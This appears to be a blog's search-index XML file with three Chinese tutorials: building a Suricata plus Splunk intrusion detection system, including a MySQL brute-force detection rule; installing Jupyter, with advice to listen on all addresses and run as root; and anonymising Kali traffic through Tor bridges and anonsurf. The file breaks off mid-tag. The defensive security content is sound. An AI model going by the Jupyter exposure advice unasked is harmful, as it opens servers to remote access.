<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>构建基于Suricata+Splunk的IDS入侵检测系统</title>
      <link href="/2017/12/23/gou-jian-ji-yu-suricata-splunk-de-ids-ru-qin-jian-ce-xi-tong/"/>
      <url>/2017/12/23/gou-jian-ji-yu-suricata-splunk-de-ids-ru-qin-jian-ce-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="一-什么是IDS和IPS"><a href="#一-什么是IDS和IPS" class="headerlink" title="一.什么是IDS和IPS"></a>一.什么是IDS和IPS</h1><p><code>IDS（Intrusion Detection Systems）</code>：</p><p>入侵检测系统，是一种网络安全设备或应用软件，可以依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，并发出安全警报。</p><p><code>IPS（Intrusion Prevention System）</code>：</p><p>入侵防御系统，除了具有IDS的监控检测功能之外，可以深度感知检测数据流量，对恶意报文进行丢弃，以阻止这些异常的或是具有伤害性的网络行为。IPS入侵防御系统，是在IDS入侵检测系统的基础上，增加了事件处理以及安全防护功能，能够主动对安全事件进行响应。</p><p><code>NSM</code>：</p><p>网络安全监控系统，用于收集、检测和分析网络安全数据，通常IDS是其组成部分之一。</p><h1 id="二-IDS-IPS的功能及分类"><a href="#二-IDS-IPS的功能及分类" class="headerlink" title="二.IDS/IPS的功能及分类"></a>二.IDS/IPS的功能及分类</h1><p>IDS根据两种方法进行分类：<code>按照数据来源</code>、<code>按照入侵检测策略</code>。</p><p>1、按照数据来源分类</p><ul><li>基于网络的入侵检测系统（NIDS）</li><li>基于主机的入侵监测系统（HIDS）</li><li>分布式入侵检测系统（DIDS）</li></ul><p>2、按照入侵检测策略分类</p><ul><li>滥用检测</li><li>异常检测</li><li>完整性分析</li></ul><p>IPS从功能上具有以下几个组成部分：</p><ul><li>数据采集：采集和捕获流量数据</li><li>入侵检测：分析流量和日志数据，发现安全异常行为并发出警报,常见的有Snort、Suricata、Bro</li><li>结果展示：用于分析IDS警报并进行友好展示,常见的IDS警报分析工具有Snorby、Sguil、Base等</li><li>安全防御：主动响应安全事件，采取丢弃数据包等等措施来阻止异常网络行为，比如与iptables联用</li></ul><h1 id="三-IDS检测方法"><a href="#三-IDS检测方法" class="headerlink" title="三.IDS检测方法"></a>三.IDS检测方法</h1><p>IDS根据入侵检测的行为分为：<code>异常检测</code>和<code>误用检测</code>。</p><p>1、异常检测方法</p><ul><li>统计异常检测方法</li><li>特征选择异常检测方法</li><li>基于贝叶斯推理异常检测方法</li><li>基于贝叶斯网络异常检测方法</li><li>基于模式预测异常检测方法</li></ul><p>2、误用检测方法</p><ul><li>基于条件的概率误用检测方法</li><li>基于专家系统误用检测方法</li><li>基于状态迁移分析误用检测方法</li><li>基于键盘监控误用检测方法</li><li>基于模型误用检测方法</li></ul><h1 id="四-构建基于Suricata-Splunk的IDS"><a href="#四-构建基于Suricata-Splunk的IDS" class="headerlink" title="四.构建基于Suricata+Splunk的IDS"></a>四.构建基于Suricata+Splunk的IDS</h1><p><code>Suricata</code></p><p> 随着越来越多的服务器将网卡升级到10GB/40GB以太网，对线路上的硬件进行计算密集型的入侵检测越来越困难。<code>suircata</code>是一款支持IDS和IPS的多线程入侵检测系统，与传统snort相比，suricata的多线程和模块化设计上使其在效率和性能上超过了原有snort，它将 CPU 密集型的深度包检测工作并行地分配给多个并发任务来完成。这样的并行检测可以充分利用多核硬件的优势来提升入侵检测系统的吞吐量，在数据包的深度检测上效果优越。并且suricata可以兼容现有的Snort规则签名，还增加了对ipv6的支持，已经逐渐成为传统snort入侵检测系统的代替方案。</p><table><thead><tr><th>参数</th><th>Snort</th><th>Suricata</th></tr></thead><tbody><tr><td>安装方式</td><td>源码安装、安装包安装</td><td>源码安装</td></tr><tr><td>协议</td><td>TCP，UDP，ICMP，IP</td><td>TCP，UDP，ICMP，IP，HTTP，FTP，TLS（SSL），SMB，DNS</td></tr><tr><td>规则</td><td>Snort规则，EmergingThreats规则</td><td>Snort规则，EmergingThreats规则，VRT::Snort 规则</td></tr><tr><td>线程</td><td>单线程</td><td>多线程</td></tr><tr><td>IPS支持</td><td>与iptables等联用实现</td><td>支持自动处理</td></tr><tr><td>IPv6支持</td><td>少数支持</td><td>全面支持</td></tr><tr><td>抓包方式</td><td>libpcap</td><td>PF_RING, cua,netmap,af-packet</td></tr><tr><td>帮助资料</td><td>官网及网络上大量资料</td><td>Suricata wiki</td></tr></tbody></table><p><code>Splunk</code></p><p> splunk是一款数据分析系统。它在快速收集、搜索、分析、实时获取数据方面的能力较为突出，效率高，能够处理PB级数据，并且它支持对数据源进行实时监控。支持自定义过滤规则。splunk使用简单，通过用户图形界面进行各种统计分析操作， 能够对数据进行可视化展示，形象直观。</p><p>本实验中利用splunk实时监控IDS的警报日志文件<code>fast.log</code>。</p><h2 id="1-安装Suricata"><a href="#1-安装Suricata" class="headerlink" title="1.安装Suricata"></a>1.安装Suricata</h2><p> <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation" target="_blank" rel="noopener">wiki参考文档</a></p><p>1.安装suricata依赖</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> -y <span class="token function">install</span> libpcre3 libpcre3-dbg libpcre3-dev \build-essential autoconf automake libtool libpcap-dev libnet1-dev \libyaml-0-2 libyaml-dev zlib1g zlib1g-dev libmagic-dev libcap-ng-dev \libjansson-dev pkg-config</code></pre><p>安装libhtp库</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone  https://github.com/OISF/libhtp.git<span class="token function">cd</span> libhtp/./autogen.sh./configure<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>2.下载suricata</p><p>去官网下载<a href="https://suricata-ids.org/download/" target="_blank" rel="noopener">suricata</a>并解压</p><p>3.编译suricata</p><p>默认模式下，Suricata以IDS模式运行，编译命令：</p><pre class=" language-bash"><code class="language-bash">./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc --localstatedir<span class="token operator">=</span>/var</code></pre><p>如果需要 Suricata 同时运行 IDS 和 IPS，需要安装额外依赖并使用如下命令进行编译</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> libnetfilter-queue-dev libnetfilter-queue1 libnfnetlink-dev libnfnetlink0  ./configure --enable-nfqueue --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc --localstatedir<span class="token operator">=</span>/var</code></pre><p>4.安装suricata</p><pre class=" language-bash"><code class="language-bash"><span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token function">sudo</span> <span class="token function">make</span> install-conf <span class="token comment" spellcheck="true"># 安装默认配置  </span><span class="token function">sudo</span> <span class="token function">make</span> install-rules <span class="token comment" spellcheck="true"># 安装默认规则  </span><span class="token function">sudo</span> ldconfig <span class="token comment" spellcheck="true"># 让系统共享动态链接库  </span></code></pre><h2 id="2-配置并使用Suricata监控安全事件"><a href="#2-配置并使用Suricata监控安全事件" class="headerlink" title="2.配置并使用Suricata监控安全事件"></a>2.配置并使用Suricata监控安全事件</h2><h3 id="1-编辑配置文件"><a href="#1-编辑配置文件" class="headerlink" title="(1) 编辑配置文件"></a>(1) 编辑配置文件</h3><p>如果我们安装时使用下面的命令，会进行默认配置，我们只需要修改相关配置文件中的参数即可。如果已经使用了默认配置，请直接跳到步骤4。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> install-conf  <span class="token comment" spellcheck="true"># 安装默认配置  </span><span class="token function">sudo</span> <span class="token function">make</span> install-rules <span class="token comment" spellcheck="true"># 安装默认规则 </span></code></pre><p>如果没有安装默认配置和规则，我们需要手动进行配置。参考步骤1、2、3。</p><h3 id="2-创建Suricata配置目录和日志目录"><a href="#2-创建Suricata配置目录和日志目录" class="headerlink" title="(2) 创建Suricata配置目录和日志目录"></a>(2) 创建Suricata配置目录和日志目录</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /var/log/suricata<span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/suricata</code></pre><h5 id="把规则文件拷贝到Suricata配置目录下"><a href="#把规则文件拷贝到Suricata配置目录下" class="headerlink" title="把规则文件拷贝到Suricata配置目录下"></a>把规则文件拷贝到Suricata配置目录下</h5><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz<span class="token function">tar</span> zxvf emerging.rules.tar.gz<span class="token function">sudo</span> <span class="token function">cp</span> -R rules/ /etc/suricata/</code></pre><h5 id="把Suricata安装源文件中的suricata-yaml、classification-config、reference-config文件拷贝到Suricata的配置目录下"><a href="#把Suricata安装源文件中的suricata-yaml、classification-config、reference-config文件拷贝到Suricata的配置目录下" class="headerlink" title="把Suricata安装源文件中的suricata.yaml、classification.config、reference.config文件拷贝到Suricata的配置目录下"></a>把Suricata安装源文件中的<code>suricata.yaml、classification.config、reference.config</code>文件拷贝到Suricata的配置目录下</h5><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> suricata<span class="token function">sudo</span> <span class="token function">cp</span> suricata.yaml classification.config reference.config /etc/suricata/</code></pre><h5 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h5><p>suricata的配置文件路径是：<code>/etc/suricata/suricata.yaml</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/suricata/suricata.yaml</code></pre><p>我们需要注意一下几个关键参数</p><p><strong><code>HOME_NET</code></strong>: 它指定了Suricata 监控的本地网络，根据自己的网络情况进行修改</p><pre class=" language-bash"><code class="language-bash">HOME_NET: <span class="token string">"[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"</span></code></pre><p><code>EXTERNAL_NET</code> 变量的 <code>!$HOME_NET</code> 代表除本地网络之外的其他网络。</p><p><strong><code>default-log-dir</code></strong>：日志文件存储路径，默认是/var/log/suricata。</p><p><strong><code>outputs</code></strong>：outputs选项下有很多可以输出的配置选项，包括警告、检测的数据包、产生的结果等，可以根据自己的需求进行配置。</p><ul><li><code>fast.log</code>：默认的警告输出文件。</li><li><code>unified2.alert</code>：数据包输出文件，将整个数据包以二进制的方式存储到文件中。</li><li><code>http.log</code>：HTTP日志，包含了http请求、HOST字段、URI字段和User-Agent字段。</li><li><code>Syslog</code>：这个选项决定了是否将suricata的警告输出到syslog文件中。</li><li><code>Drop.log</code>：当suricata工作在IPS模式下的时候，可以使用drop操作规则，这些drop掉的数据包信息就会存储在drop.log文件中</li></ul><p><strong><code>max-pending-packets</code></strong>: 设置suricata能同时处理的数据包数量，最少为1，最大值取决于内存的大小，更大的内存可以设置更大的值并拥有更好的性能，默认值是1024。</p><p><strong><code>default-packet-size</code></strong>：对处理的每个数据包的大小进行限制。默认值是1514，也是TCP数据包的最大长度（当数据超过这个长度便会使用TCP报文重组技术）。</p><h3 id="3-编辑测试规则"><a href="#3-编辑测试规则" class="headerlink" title="(3) 编辑测试规则"></a>(3) 编辑测试规则</h3><p>针对suricata的安全规则的配置，可以参考<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Rules" target="_blank" rel="noopener">suricata配置文档</a></p><p>修改<code>/etc/suricata/suricata.yaml</code>文件，设置我们的测试规则文件<code>my.rules</code></p><pre class=" language-bash"><code class="language-bash">default-rule-path: /etc/suricata/rulesrule-files: - my.rules</code></pre><p>然后我们去<code>/etc/suricata/rules</code>目录下创建我们的自定义规则文件<code>my.rules</code></p><p>在该文件中，我们写下自己的测试规则</p><pre class=" language-bash"><code class="language-bash">alert icmp <span class="token variable">$HOME_NET</span> any -<span class="token operator">></span> <span class="token variable">$EXTERNAL_NET</span> any <span class="token punctuation">(</span>msg:<span class="token string">"TEST :ICMP PING"</span><span class="token punctuation">;</span> itype:8<span class="token punctuation">;</span> sid:20000<span class="token punctuation">;</span> rev:3<span class="token punctuation">;</span><span class="token punctuation">)</span>alert tcp any any -<span class="token operator">></span> any 80 <span class="token punctuation">(</span>msg:<span class="token string">"http test"</span><span class="token punctuation">;</span><span class="token punctuation">)</span>alert http any any -<span class="token operator">></span> any any <span class="token punctuation">(</span>msg:<span class="token string">"Filemagic jgp(1)"</span><span class="token punctuation">;</span> flow:established<span class="token punctuation">;</span> filemagic:<span class="token string">"JPEG image data"</span><span class="token punctuation">;</span> filestore<span class="token punctuation">;</span> sid:10<span class="token punctuation">;</span> rev:1<span class="token punctuation">;</span><span class="token punctuation">)</span></code></pre><h3 id="4-运行suricata进行测试"><a href="#4-运行suricata进行测试" class="headerlink" title="(4) 运行suricata进行测试"></a>(4) 运行suricata进行测试</h3><p>Suricata有不同的运行模式，我们可以使用如下命令查看</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> suricata --list-runmodes</code></pre><p>启动Suricata之前，强烈建议先关闭网卡的LRO/GRO功能（即网卡收包时将同一流的小包合并成大包）。这会导致Suricata处理时很容易出现丢包问题，传输速度慢。解决方法，关闭LRO/GRO功能，命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ethtool</span> -k eth0 <span class="token comment" spellcheck="true">#查看LRO/GRO当前是否打开</span><span class="token function">ethtool</span> -K eth0 lro off <span class="token comment" spellcheck="true">#关闭LRO</span><span class="token function">ethtool</span> -K eth0 gro off <span class="token comment" spellcheck="true">#关闭GRO</span></code></pre><p>如果看到下列警示信息，可以忽视。它说明你的网卡不支持LRO。</p><pre class=" language-bash"><code class="language-bash">Cannot change large-receive-offload</code></pre><p>然后我们启动suricata</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> suricata -c /etc/suricata/suricata.yaml -i eth0</code></pre><p>此时，suricata会开始监听我们的流量，如果触发了规则，会在默认日志路径<code>/var/log/suricata/</code>下产生警报文件<code>fast.log</code></p><h2 id="3-使用Suricata监控网络攻击"><a href="#3-使用Suricata监控网络攻击" class="headerlink" title="3.使用Suricata监控网络攻击"></a>3.使用Suricata监控网络攻击</h2><p>模拟网络攻击：mysql暴力破解</p><p>IDS检测规则</p><pre class=" language-bash"><code class="language-bash">alert tcp <span class="token variable">$EXTERNAL_NET</span> any -<span class="token operator">></span> <span class="token variable">$HOME_NET</span> 3306 <span class="token punctuation">(</span>msg:<span class="token string">"MySQL Login Attack"</span><span class="token punctuation">;</span> sid:11619<span class="token punctuation">;</span> gid:3<span class="token punctuation">;</span> rev:6<span class="token punctuation">;</span> classtype:attempted-admin<span class="token punctuation">;</span> reference:cve,2006-1518<span class="token punctuation">;</span> metadata: engine shared, soid 3<span class="token operator">|</span>11619, <span class="token function">service</span> mysql<span class="token punctuation">;</span><span class="token punctuation">)</span></code></pre><p>此规则可以检测出尝试枚举mysql管理员密码的暴力破解攻击。</p><h2 id="4-使用Splunk分析展示IDS警报"><a href="#4-使用Splunk分析展示IDS警报" class="headerlink" title="4.使用Splunk分析展示IDS警报"></a>4.使用Splunk分析展示IDS警报</h2><p>下载<a href="https://www.splunk.com/en_us/download" target="_blank" rel="noopener">splunklight版</a></p><p>安装web环境：php+apache2</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.0 libapache2-mod-php7.0 apache2</code></pre><p>运行splunk服务</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> splunk\bin\./splunk start</code></pre><p>然后访问本机8080端口即可。我们可以动态监控警报文件<code>/var/log/suricata/fast.log</code></p>]]></content>
      
      
      <categories>
          
          <category> 安全建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDS </tag>
            
            <tag> Snort </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>jupyter及jupyterlab安装使用</title>
      <link href="/2017/11/18/jupyter-ji-jupyterlab-an-zhuang-shi-yong/"/>
      <url>/2017/11/18/jupyter-ji-jupyterlab-an-zhuang-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="一-jupyter安装及简单使用"><a href="#一-jupyter安装及简单使用" class="headerlink" title="一.jupyter安装及简单使用"></a>一.jupyter安装及简单使用</h1><p><a href="https://github.com/jupyter/notebook" target="_blank" rel="noopener">Jupyther notebook</a>（曾经的Ipython notebook），是一个可以把代码、图像、注释、公式和作图集于一处，实现可读性及可视化分析的工具，支持多种编程语言。<a href="http://jupyter.readthedocs.io/en/latest/" target="_blank" rel="noopener">官方使用手册</a>。安装前，你需要装好python环境，并且安装pip包管理器并更新</p><pre class=" language-python"><code class="language-python">pip install <span class="token operator">-</span><span class="token operator">-</span>upgrade pippip3 install <span class="token operator">-</span><span class="token operator">-</span>upgrade pip</code></pre><h2 id="1-安装jupyter"><a href="#1-安装jupyter" class="headerlink" title="1.安装jupyter"></a>1.安装jupyter</h2><p><strong>Python2</strong></p><pre class=" language-python"><code class="language-python">pip install jupyter notebook<span class="token punctuation">(</span>python <span class="token operator">-</span>m pip install jupyter<span class="token punctuation">)</span></code></pre><p><strong>Python3</strong></p><pre class=" language-python"><code class="language-python">pip3 install jupyter notebook<span class="token punctuation">(</span>python3 <span class="token operator">-</span>m pip install jupyter<span class="token punctuation">)</span></code></pre><h2 id="2-配置jupyter（可选）"><a href="#2-配置jupyter（可选）" class="headerlink" title="2.配置jupyter（可选）"></a>2.配置jupyter（可选）</h2><p>生成jupyter配置文件：</p><pre class=" language-python"><code class="language-python">jupyter notebook <span class="token operator">-</span><span class="token operator">-</span>generate<span class="token operator">-</span>config</code></pre><p>此时会在你的个人用户目录下的<code>.jupyter</code> 下生成配置文件 <code>jupyter_notebook_config.py</code>，打开以后找到如下一行：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#c.NotebookApp.ip = 'localhost'</span></code></pre><p>这里配置的是是允许访问的IP地址，这里改为<code>*</code>，意思为允许所有ip连接。：</p><pre class=" language-bash"><code class="language-bash">c.NotebookApp.ip <span class="token operator">=</span> <span class="token string">'*'</span></code></pre><blockquote><p>注：如果你在服务器上运行，需要采用这种方式，并且为了安全考虑，最好将<code>c.NotebookApp.ip</code>的值设置为<code>Client</code>的ip。</p></blockquote><h2 id="3-运行jupyter"><a href="#3-运行jupyter" class="headerlink" title="3.运行jupyter"></a>3.运行jupyter</h2><p>运行jupyter的命令为：</p><pre class=" language-bash"><code class="language-bash">jupyter notebook<span class="token punctuation">(</span>ipython notebook<span class="token punctuation">)</span></code></pre><p>如果你只是本地运行，并且没有生成配置文件，那么运行命令如下：</p><pre class=" language-bash"><code class="language-bash">jupyter notebook --ip<span class="token operator">=</span>0.0.0.0jupyter notebook --ip<span class="token operator">=</span>0.0.0.0 --allow-root    <span class="token punctuation">(</span>root权限运行<span class="token punctuation">)</span></code></pre><h2 id="4-jupyter必要环境配置"><a href="#4-jupyter必要环境配置" class="headerlink" title="4.jupyter必要环境配置"></a>4.jupyter必要环境配置</h2><h3 id="1-生成环境配置文件"><a href="#1-生成环境配置文件" class="headerlink" title="(1) 生成环境配置文件"></a>(1) 生成环境配置文件</h3><pre class=" language-bash"><code class="language-bash">ipython profile create</code></pre><p>此时会在你的家目录生成配置文件<code>.ipython/profile_default/ipython_kernel_config.py</code></p><h3 id="2-运行代码后自动显示变量值"><a href="#2-运行代码后自动显示变量值" class="headerlink" title="(2) 运行代码后自动显示变量值"></a>(2) 运行代码后自动显示变量值</h3><p>直接在该文件的头部添加代码</p><pre class=" language-bash"><code class="language-bash">c <span class="token operator">=</span> get_config<span class="token punctuation">(</span><span class="token punctuation">)</span>c.InteractiveShell.ast_node_interactivity <span class="token operator">=</span> <span class="token string">"all"</span></code></pre><h3 id="3-中文编码问题"><a href="#3-中文编码问题" class="headerlink" title="(3) 中文编码问题"></a>(3) 中文编码问题</h3><p><code>vi ~/.ipython/ipythonrc</code></p><pre class=" language-bash"><code class="language-bash">readline_parse_and_bind <span class="token string">"\M-i"</span><span class="token keyword">:</span> <span class="token string">"    "</span>readline_parse_and_bind <span class="token string">"\M-o"</span><span class="token keyword">:</span> <span class="token string">"\d\d\d\d"</span>readline_parse_and_bind <span class="token string">"\M-I"</span><span class="token keyword">:</span> "\d\d\d\d</code></pre><p>注释掉这3行</p><h3 id="4-matplotlib作图显示中文"><a href="#4-matplotlib作图显示中文" class="headerlink" title="(4) matplotlib作图显示中文"></a>(4) matplotlib作图显示中文</h3><p>需要设置中文字体，否则中文会乱码。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> matplotlib.pyplot as plt  plt.rc<span class="token punctuation">(</span><span class="token string">'font'</span>, family<span class="token operator">=</span><span class="token string">'Microsoft YaHei Mono'</span>, size<span class="token operator">=</span>12<span class="token punctuation">)</span></code></pre><h2 id="5-常用快捷键"><a href="#5-常用快捷键" class="headerlink" title="5.常用快捷键"></a>5.常用快捷键</h2><ul><li>在当前cell的上一层添加cell：A</li><li>在当前cell的下一蹭添加cell：B</li><li>双击d：删除当前cell</li><li>撤销对某个cell的删除：z</li><li>当前的cell进入编辑模式：Enter</li><li>退出当前cell的编辑模式：Esc</li><li>执行当前cell并跳到下一个cell：Shift Enter</li><li>执行当前cell执行后不调到下一个cell：Ctrl Enter</li><li>向下选择多个cell:Shift + J 或 Shift + Down</li><li>向上选择多个cell：Shift + K 或 Shift + Up</li><li>合并cell：Shift + M</li><li>在代码中查找、替换，忽略输出：Esc + F</li><li>在cell和输出结果间切换：Esc + O</li><li>快速跳转到首个cell：Crtl Home</li><li>快速跳转到最后一个cell：Crtl End</li><li>m：进入markdown模式，编写md的文档进行描述说明</li><li>为当前的cell加入line number：单L</li><li>将当前的cell转化为具有一级标题的maskdown：单1</li><li>将当前的cell转化为具有二级标题的maskdown：单2</li><li>将当前的cell转化为具有三级标题的maskdown：单3</li><li>为一行或者多行添加/取消注释：Crtl /</li><li>在浏览器的各个Tab之间切换：Crtl PgUp和Crtl PgDn</li></ul><h1 id="二-JupyterLab安装使用"><a href="#二-JupyterLab安装使用" class="headerlink" title="二.JupyterLab安装使用"></a>二.JupyterLab安装使用</h1><p><code>JupyterLab</code>是<code>Jupyter Notebook</code>的增强版本，看起来更像是一个IDE。</p><h2 id="1-安装jupyterlab"><a href="#1-安装jupyterlab" class="headerlink" title="1.安装jupyterlab"></a>1.安装jupyterlab</h2><p><strong>Python2</strong></p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> jupyterlab<span class="token punctuation">(</span>python -m pip <span class="token function">install</span> jupyterlab<span class="token punctuation">)</span></code></pre><p><strong>Python3</strong></p><pre class=" language-bash"><code class="language-bash">pip3 <span class="token function">install</span> jupyterlab<span class="token punctuation">(</span>python3 -m pip <span class="token function">install</span> jupyterlab<span class="token punctuation">)</span></code></pre><p>如果你使用的Jupyter版本早于5.3，那么你还需要运行以下命令来启动JupyterLab服务组件。</p><pre class=" language-bash"><code class="language-bash">jupyter serverextension <span class="token function">enable</span> --pjupyterlab --sys-prefix</code></pre><h3 id="2-运行jupyterlab"><a href="#2-运行jupyterlab" class="headerlink" title="2.运行jupyterlab"></a>2.运行jupyterlab</h3><p>使用以下命令运行<code>JupyterLab</code>：</p><pre class=" language-bash"><code class="language-bash">jupyter lab --ip<span class="token operator">=</span>0.0.0.0 --allow-root</code></pre><h2 id="3-管理jupyterlab"><a href="#3-管理jupyterlab" class="headerlink" title="3.管理jupyterlab"></a>3.管理jupyterlab</h2><h3 id="查看令牌"><a href="#查看令牌" class="headerlink" title="查看令牌"></a>查看令牌</h3><pre class=" language-bash"><code class="language-bash">$ jupyter notebook listhttp://localhost:8888/?token<span class="token operator">=</span>c8de56fa<span class="token punctuation">..</span>. :: /Users/you/notebooks</code></pre><h3 id="列出已安装扩展"><a href="#列出已安装扩展" class="headerlink" title="列出已安装扩展"></a>列出已安装扩展</h3><pre><code>jupyter labextension list</code></pre><h3 id="卸载已安装扩展"><a href="#卸载已安装扩展" class="headerlink" title="卸载已安装扩展"></a>卸载已安装扩展</h3><pre class=" language-bash"><code class="language-bash">jupyter labextension uninstall my-extension</code></pre><p>其中<code>my-extension</code>是扩展名列表中的打印名称。您也可以使用此命令卸载核心扩展（以后可以随时重新安装核心扩展）。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://jupyterlab.readthedocs.io/en/latest/user/extensions.html" target="_blank" rel="noopener">https://jupyterlab.readthedocs.io/en/latest/user/extensions.html</a><br><a href="https://github.com/jupyterlab/jupyterlab#getting-help" target="_blank" rel="noopener">https://github.com/jupyterlab/jupyterlab#getting-help</a><br><a href="https://gitter.im/jupyterlab/jupyterlab" target="_blank" rel="noopener">https://gitter.im/jupyterlab/jupyterlab</a><br><a href="http://jupyterlab.github.io/jupyterlab/" target="_blank" rel="noopener">http://jupyterlab.github.io/jupyterlab/</a></p>]]></content>
      
      
      <categories>
          
          <category> 程序代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jupyter </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali使用用anonsurf配合tor匿名上网</title>
      <link href="/2017/10/14/kali-shi-yong-yong-anonsurf-pei-he-tor-ni-ming-shang-wang/"/>
      <url>/2017/10/14/kali-shi-yong-yong-anonsurf-pei-he-tor-ni-ming-shang-wang/</url>
      
        <content type="html"><![CDATA[<p>整个系统应用TOR匿名，<code>Anonsurf</code>在后台运行并不断更改IP地址。</p><blockquote><p>注意，国内环境下前提是你的kali能够翻&amp;墙</p></blockquote><h1 id="安装配置tor"><a href="#安装配置tor" class="headerlink" title="安装配置tor"></a>安装配置tor</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tor</code></pre><p>去<code>bridges.torproject.org</code>获取bridges信息，然后修改<code>/etc/tor/torrc</code>文件，添加如下内容：</p><pre class=" language-bash"><code class="language-bash">Bridge 158.69.204.189:990 5A5103F99EDA9E2F136CE38F3C041C0D67320EFCBridge 77.198.28.226:37911 E27AAA7EE9F15324A02115ADD85136295F796211Bridge 96.230.139.74:9001 5F3B7E2CDB9D420F9FBAC6C764BA62D49CF68DE3VirtualAddrNetwork 10.192.0.0/10AutomapHostsOnResolve 1TransPort 9040SocksPort 9050DNSPort 53RunAsDaemon 1SocksListenAddress 127.0.0.1</code></pre><p>开启tor服务，测试可用性：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">service</span> tor startsystemctl status tor<span class="token function">netstat</span> -antu <span class="token operator">|</span> <span class="token function">grep</span> 9050tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN</code></pre><p>此时，为浏览器设置socks5代理，端口设置为<code>9050</code>。此时我们访问任意<code>.onion</code>站点，如<a href="http://3g2upl4pq6kufc4m.onion/" target="_blank" rel="noopener">DuckDuckGo</a>，测试是否处于tor网络下。如果能够正常访问<code>onion</code>网站以及其他网站，说明tor配置正确。</p><h1 id="安装Anonsurf"><a href="#安装Anonsurf" class="headerlink" title="安装Anonsurf"></a>安装Anonsurf</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Und3rf10w/kali-anonsurf.git<span class="token function">cd</span> kali-anonsurf/<span class="token function">sudo</span> ./installer.sh</code></pre><p>在Kali Linux，安装完毕后，anonsurf会自动更新编辑<code>/etc/tor/torrc</code>文件并添加以下几行：</p><pre class=" language-bash"><code class="language-bash">VirtualAddrNetwork 10.192.0.0/10AutomapHostsOnResolve 1TransPort 9040SocksPort 9050DNSPort 53RunAsDaemon 1</code></pre><p>它还会将解析程序配置更改为以下内容：</p><pre class=" language-bash"><code class="language-bash">nameserver 127.0.0.1nameserver 209.222.18.222nameserver 209.222.18.218</code></pre><p>如果你不喜欢使用<a href="https://www.blackmoreops.com/2015/03/01/setup-vpn-on-kali-linux" target="_blank" rel="noopener">专用Internet访问DNS</a>，只需在<code>/etc/init.d/anonsurf</code>脚本中更改以下行中的DNS ：</p><pre class=" language-bash"><code class="language-bash"> <span class="token keyword">echo</span> -e <span class="token string">'nameserver 127.0.0.1\nnameserver 209.222.18.222\nnameserver 209.222.18.218'</span> <span class="token operator">></span> /etc/resolv.conf <span class="token keyword">echo</span> -e <span class="token string">" <span class="token variable">$GREEN*</span><span class="token variable">$BLUE</span> Modified resolv.conf to use Tor and Private Internet Access DNS"</span></code></pre><p>我们可以启动anonsurf，通过tor传输数据：</p><p>以后使用时，我们不必提前开启tor服务，anonsurf会自动帮我们完成。</p><pre class=" language-bash"><code class="language-bash">anonsurf start</code></pre><p>关闭anonsurf</p><pre class=" language-bash"><code class="language-bash">anonsurf stop</code></pre><p>帮助命令</p><pre class=" language-bash"><code class="language-bash">anonsurf       <span class="token comment" spellcheck="true">#查看帮助</span>anonsurf start  <span class="token comment" spellcheck="true">#开启隐身</span>anonsurf myip      <span class="token comment" spellcheck="true">#查看自己的ip</span>anonsurf restart <span class="token comment" spellcheck="true">#可以更换代理IP</span>anonsurf stop      <span class="token comment" spellcheck="true">#停止隐身</span>anonsurf starti2p <span class="token comment" spellcheck="true">#开启i2p服务</span>anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服务</span></code></pre><h1 id="安装I2P-可选"><a href="#安装I2P-可选" class="headerlink" title="安装I2P(可选)"></a>安装I2P(可选)</h1><p>1.添加源</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"deb https://deb.i2p2.de/ wheezy main"</span> <span class="token operator">>></span> /etc/apt/sources.list</code></pre><p>2.添加<code>deb.i2p2.de</code>的<code>public key</code></p><pre class=" language-bash"><code class="language-bash">apt-key adv --recv 67ECE5605BCF1346</code></pre><p>如果不添加public key，等会更新时可能会报错如下：</p><pre 